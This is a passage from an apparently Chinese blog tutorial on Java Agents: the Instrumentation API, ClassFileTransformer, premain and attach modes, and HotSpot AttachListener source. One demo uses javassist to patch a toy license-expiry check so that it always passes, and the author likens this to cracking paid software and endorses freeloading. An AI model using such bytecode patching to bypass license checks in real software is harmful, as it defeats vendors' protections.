class="params">()</span>方法获得的，并作为参数提供给appendToClassPathForInstrumentation方法。</span></span><br><span class="line"><span class="function">此方法不会改变java.class.path系统属性的值。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isNativeMethodPrefixSupported</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回当前JVM配置是否支持设置本地方法前缀。设置本地方法前缀的能力是JVM的一个可选能力。</span></span><br><span class="line"><span class="function">      只有在代理 JAR 文件中 Can-Set-Native-Method-Prefix manifest 属性被设置为 <span class="keyword">true</span>（如包规范中所述）且 JVM 支持该能力时，才会支持设置本地方法前缀。</span></span><br><span class="line"><span class="function">      在单个JVM的单个实例化过程中，对该方法的多次调用将始终返回相同的答案。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer,String prefix)</span></span></span><br><span class="line"><span class="function">      设置<span class="keyword">native</span> method 前缀</span></span><br></pre></td></tr></table></figure><h1 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h1><p><code>java.lang.instrument.ClassFileTransformer</code>是一个转换类文件的代理接口，我们可以在获取到<code>Instrumentation</code>对象后通过<code>addTransformer</code>方法添加自定义类文件转换器。</p><p>可以使用<code>addTransformer</code>注册一个我们自定义的<code>Transformer</code>到<code>Java Agent</code>，当有新的类被<code>JVM</code>加载时<code>JVM</code>会自动回调用我们自定义的<code>Transformer</code>类的<code>transform</code>方法，传入该类的<code>transform</code>信息(<code>类名、类加载器、类字节码</code>等)，==可以根据传入的类信息决定是否需要修改类字节码，修改完字节码后将新的类字节码返回给<code>JVM</code>==，<code>JVM</code>会验证类和相应的修改是否合法，如果符合类加载要求<code>JVM</code>会加载我们修改后的类字节码。</p><p>继续读JavaDoc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">通常，一个Agent提供了这个接口的实现，以便转换类文件。转换发生在JVM定义类之前。</span><br><span class="line">请注意，类文件这个术语在Java™虚拟机规范第<span class="number">3.1</span>节中定义，指的是类文件格式的字节序列，无论它们是否驻留在文件中。</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">byte</span>[] transform(ClassLoader loader,</span><br><span class="line">                 String className,</span><br><span class="line">                 Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                 ProtectionDomain protectionDomain,</span><br><span class="line">                 <span class="keyword">byte</span>[] classfileBuffer)</span><br><span class="line">          <span class="keyword">throws</span> IllegalClassFormatException</span><br><span class="line"></span><br><span class="line">该方法的实现可以对提供的类文件进行转换，并返回一个新的替换类文件。</span><br><span class="line">  一旦用addTransformer注册了一个Transformer，那么每一个新的类定义和每一个类的重新定义都会调用这个变换器。能够重构的变换器也会在每次类重构时被调用。</span><br><span class="line">  新类定义的请求是通过ClassLoader.defineClass或其原生等价物来实现的。</span><br><span class="line">  对类的redefinition的请求是通过Instrumentation.redefineClasses或它的本机等价物提出的。</span><br><span class="line">  类的retransformation请求由 Instrumentation.retransformClasses 或其本机等价物发出。</span><br><span class="line">  在请求的处理过程中，在类文件字节被验证或应用之前，Transformer被调用。</span><br><span class="line">  当有多个Transformer时，Transformer是通过链式变换调用组成的。也就是说，一次变换调用返回的字节数组成为下一次调用的输入（通过classfileBuffer参数）。</span><br><span class="line">  </span><br><span class="line">  对于retransformation，不能重构的变换器不被调用，而是重用之前变换的结果。在所有其他情况下，这个方法都会被调用。在这些分组中，transformers按照注册的顺序被调用。原生变换器由Java虚拟机工具接口中的ClassFileLoadHook事件提供。</span><br><span class="line">  参数：</span><br><span class="line">  loader              定义要转换的类加载器；如果是引导加载器，则为 <span class="keyword">null</span></span><br><span class="line">className           类名,如:java/lang/Runtime</span><br><span class="line">  classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 <span class="keyword">null</span></span><br><span class="line">  protectionDomain    要定义或重定义的类的保护域</span><br><span class="line">  classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> 字节码<span class="keyword">byte</span>数组</span><br></pre></td></tr></table></figure><p><strong>重写<code>transform</code>方法需要注意以下事项：</strong></p><ol><li><code>ClassLoader</code>如果是被<code>Bootstrap ClassLoader(引导类加载器)</code>所加载那么<code>loader</code>参数的值是空。</li><li>修改类字节码时需要特别注意插入的代码在对应的<code>ClassLoader</code>中可以正确的获取到，否则会报<code>ClassNotFoundException</code>，比如修改<code>java.io.FileInputStream(该类由Bootstrap ClassLoader加载)</code>时插入了我们检测代码，那么我们将必须保证<code>FileInputStream</code>能够获取到我们的检测代码类。</li><li><code>JVM</code>类名的书写方式路径方式：<code>java/lang/String</code> 而不是我们常用的类名方式：<code>java.lang.String</code>。</li><li>类字节必须符合<code>JVM</code>校验要求，如果无法验证类字节码会导致<code>JVM</code>崩溃或者<code>VerifyError(类验证错误)</code>。</li><li>如果修改的是<code>retransform</code>类(修改已被<code>JVM</code>加载的类)，修改后的类字节码不得<code>新增方法</code>、<code>修改方法参数</code>、<code>类成员变量</code>。</li><li><code>addTransformer</code>时如果没有传入<code>retransform</code>参数(默认是<code>false</code>)就算<code>MANIFEST.MF</code>中配置了<code>Can-Redefine-Classes: true</code>而且手动调用了<code>retransformClasses</code>方法也一样无法<code>retransform</code>。一定要增加true参数！！！</li><li>卸载<code>transform</code>时需要使用创建时的<code>Instrumentation</code>实例。</li></ol><p>Java Agent还限制了我们：</p><ol><li>必须以jar包的形式运行或加载；</li><li>必须包含<code>/META-INF/MANIFEST.MF</code>文件，且该文件中必须定义好<code>Premain-Class</code>（启动前Agent模式）或<code>Agent-Class:</code>（运行中Agent模式）配置；</li><li>如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在<code>MANIFEST.MF</code>中添加<code>Can-Retransform-Classes: true</code>或<code>Can-Redefine-Classes: true</code>。</li></ol><h1 id="实验部分"><a href="#实验部分" class="headerlink" title="实验部分"></a>实验部分</h1><p>接下来进行实验，启动前<code>premain+-javaagent</code>以及启动中<code>Attach</code> 两种模式。</p><h2 id="启动前指定Agent位置"><a href="#启动前指定Agent位置" class="headerlink" title="启动前指定Agent位置"></a>启动前指定Agent位置</h2><p>如果需要在目标JVM启动的同时加载Agent，实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;</span><br><span class="line">[<span class="number">2</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure><p>JVM将首先寻找[1]，如果没有发现[1]，再寻找[2]。</p><h3 id="实战一：premain方法测试"><a href="#实战一：premain方法测试" class="headerlink" title="实战一：premain方法测试"></a>实战一：premain方法测试</h3><p>写一个demo做个实验：</p><p>创建Agent类，声明premain方法：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201222948010.png" alt="image-20210201222948010"></p><p>使用maven-jar-plugin，创建MANIFEST.MF：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223255740.png" alt="image-20210201223255740"></p><p>MANIFEST.MF：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223426121.png" alt="image-20210201223426121"></p><p><code>mvn clean install</code>生成jar包：<code>java_agent_01-1.0-SNAPSHOT</code></p><p>待插桩类：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223908739.png" alt="image-20210201223908739"></p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223920391.png" alt="image-20210201223920391"></p><p>同样打包，<code>example01-1.0-SNAPSHOT</code>：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223953455.png" alt="image-20210201223953455"></p><p>终端执行，成功插桩：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201224546368.png" alt="image-20210201224546368"></p><h3 id="实战二：打印加载的类"><a href="#实战二：打印加载的类" class="headerlink" title="实战二：打印加载的类"></a>实战二：打印加载的类</h3><p>之前也提到，一旦你addTransformer之后，需要加载的每一个类都会经过transform方法。</p><p>一旦用addTransformer注册了一个Transformer，那么每一个新的类定义和每一个类的重新定义都会调用这个变换器。</p><p>首先addTranformer：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209211836621.png" alt="image-20210209211836621"></p><p>这里ClassFileTransformerDemo()继承了ClassFileTransformer类，记得最后加上ture：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209212017484.png" alt="image-20210209212017484"></p><p>这里就是简单的执行了打印在Tranformer之后加载的类：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209212111604.png" alt="image-20210209212111604"></p><h3 id="实战三：代码插桩"><a href="#实战三：代码插桩" class="headerlink" title="实战三：代码插桩"></a>实战三：代码插桩</h3><p>这里复现一下<a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open" target="_blank" rel="noopener">yz</a>的实验。这个例子写得很好，类似于破解官方软件的一种绕过过程，毕竟白嫖才是最香的。</p><p>首先这里有一个校验函数用来判断用户是否已经过了有效期，这个截止日期是硬编码在代码中的，由于是写死的那么就会一直提示已经过期：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CheckLicense</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> SimpleDateFormat DATE_FORMAT = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkExpiry</span><span class="params">(String expireDate)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Date date = DATE_FORMAT.parse(expireDate);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检测当前系统时间早于License授权截至时间</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> Date().before(date)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 设置一个已经过期的License时间</span></span><br><span class="line">        <span class="keyword">final</span> String expireDate = <span class="string">"2020-10-01 00:00:00"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        String time = <span class="string">"["</span> + DATE_FORMAT.format(<span class="keyword">new</span> Date()) + <span class="string">"] "</span>;</span><br><span class="line">                        <span class="comment">// 检测license是否已经过期</span></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (checkExpiry(expireDate)) &#123;</span><br><span class="line">                                System.err.println(time + <span class="string">"您的授权已过期，请重新购买授权！"</span>);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                System.out.println(time + <span class="string">"您的授权正常，截止时间为："</span> + expireDate);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// sleep 1秒</span></span><br><span class="line">                        TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>硬编码有效期是一个已经过期的License时间<code>final String expireDate = &quot;2020-10-01 00:00:00&quot;;</code></p><p>已经过期：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209231744276.png" alt="image-20210209231744276"></p><p>这里开始编写Agent：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassFileTransformerDemo</span>  <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要被Hook的类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String HOOK_CLASS = <span class="string">"com.sec.CheckLicense"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将目录路径替换成Java类名</span></span><br><span class="line">        String cn = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只处理HOOK_CLASS类的字节码</span></span><br><span class="line">        <span class="keyword">if</span> (cn.equals(HOOK_CLASS)) &#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(cn);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClassPool classPool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 使用javassist将类二进制解析成CtClass对象</span></span><br><span class="line">                CtClass ctClass = classPool.makeClass(<span class="keyword">new</span> ByteArrayInputStream(classfileBuffer));</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 使用CtClass对象获取checkExpiry方法，类似于Java反射机制的clazz.getDeclaredMethod(xxx)</span></span><br><span class="line">                CtMethod ctMethod = ctClass.getDeclaredMethod(</span><br><span class="line">                        <span class="string">"checkExpiry"</span>, <span class="keyword">new</span> CtClass[]&#123;classPool.getCtClass(<span class="string">"java.lang.String"</span>)&#125;</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 在checkExpiry方法执行前插入输出License到期时间代码</span></span><br><span class="line">                ctMethod.insertBefore(<span class="string">"System.out.println(\"License到期时间：\" + $1);"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 修改checkExpiry方法的返回值，将授权过期改为未过期</span></span><br><span class="line">                ctMethod.insertAfter(<span class="string">"return false;"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 修改后的类字节码</span></span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里相当于将检测日期函数写死return false。</p><p>打包，运行：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210034102611.png" alt="image-20210210034102611"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>MANIFEST.MF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/DEPENDENCIES<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/LICENSE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/NOTICE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactSet</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>org.javassist:javassist:jar:*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">artifactSet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="comment">&lt;!-- 修改第三方依赖包名称 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">relocations</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">relocation</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">shadedPattern</span>&gt;</span>com.fxc.deps.javassist<span class="tag">&lt;/<span class="name">shadedPattern</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">relocation</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">relocations</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="启动中进行Agent-Attach"><a href="#启动中进行Agent-Attach" class="headerlink" title="启动中进行Agent Attach"></a>启动中进行Agent Attach</h2><p>之前的<code>permain</code>方法只能在java程序启动之前执行，而Java SE 6的新特性改变了这种情况，可以通过Java Tool API中的attach方式来达到这种程序启动之后设置代理的效果。</p><p>下面来分析一下动态加载Agent的相关技术细节。</p><h3 id="AttachListener"><a href="#AttachListener" class="headerlink" title="AttachListener"></a>AttachListener</h3><p>Attach机制通过Attach Listener线程来进行相关事务的处理，下面来看一下Attach Listener线程是如何初始化的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Starts the Attach Listener thread</span></span><br><span class="line"><span class="comment">//创建AttachListener线程</span></span><br><span class="line"><span class="keyword">void</span> AttachListener::init() &#123;</span><br><span class="line">  <span class="comment">// 创建线程相关部分代码被去掉了</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> thread_name[] = <span class="string">"Attach Listener"</span>;</span><br><span class="line">  Handle <span class="built_in">string</span> = java_lang_String::create_from_str(thread_name, THREAD);</span><br><span class="line">  &#123; <span class="function">MutexLocker <span class="title">mu</span><span class="params">(Threads_lock)</span></span>;</span><br><span class="line">    JavaThread* listener_thread = <span class="keyword">new</span> JavaThread(&amp;attach_listener_thread_entry);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个线程启动之后都需要指定一个入口来执行代码，Attach Listener线程的入口是attach_listener_thread_entry，下面看一下这个函数的具体实现：</p><p>下面看attach_listener_thread_entry的具体实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">attach_listener_thread_entry</span><span class="params">(JavaThread* thread, TRAPS)</span> </span>&#123;</span><br><span class="line">  AttachListener::set_initialized();</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">//拉取一个需要执行的任务</span></span><br><span class="line">      AttachOperation* op = AttachListener::dequeue();</span><br><span class="line">      <span class="comment">// find the function to dispatch too</span></span><br><span class="line">      AttachOperationFunctionInfo* info = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; funcs[i].name != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* name = funcs[i].name;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(op-&gt;name(), name) == <span class="number">0</span>) &#123;</span><br><span class="line">          info = &amp;(funcs[i]); <span class="keyword">break</span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">       <span class="comment">// dispatch to the function that implements this operation</span></span><br><span class="line">        res = (info-&gt;func)(op, &amp;st);</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个函数执行逻辑，大概是这样的：</p><ul><li>拉取一个需要执行的任务：AttachListener::dequeue。</li><li>查询匹配的命令处理函数。</li><li>执行匹配到的命令执行函数。</li></ul><p>其中第二步里面存在一个命令函数表，整个表如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> AttachOperationFunctionInfo funcs[] = &#123;</span><br><span class="line">  &#123; <span class="string">"agentProperties"</span>,  get_agent_properties &#125;,</span><br><span class="line">  &#123; <span class="string">"datadump"</span>,         data_dump &#125;,</span><br><span class="line">  &#123; <span class="string">"dumpheap"</span>,         dump_heap &#125;,</span><br><span class="line">  &#123; <span class="string">"load"</span>,             load_agent &#125;,</span><br><span class="line">  &#123; <span class="string">"properties"</span>,       get_system_properties &#125;,</span><br><span class="line">  &#123; <span class="string">"threaddump"</span>,       thread_dump &#125;,</span><br><span class="line">  &#123; <span class="string">"inspectheap"</span>,      heap_inspection &#125;,</span><br><span class="line">  &#123; <span class="string">"setflag"</span>,          set_flag &#125;,</span><br><span class="line">  &#123; <span class="string">"printflag"</span>,        print_flag &#125;,</span><br><span class="line">  &#123; <span class="string">"jcmd"</span>,             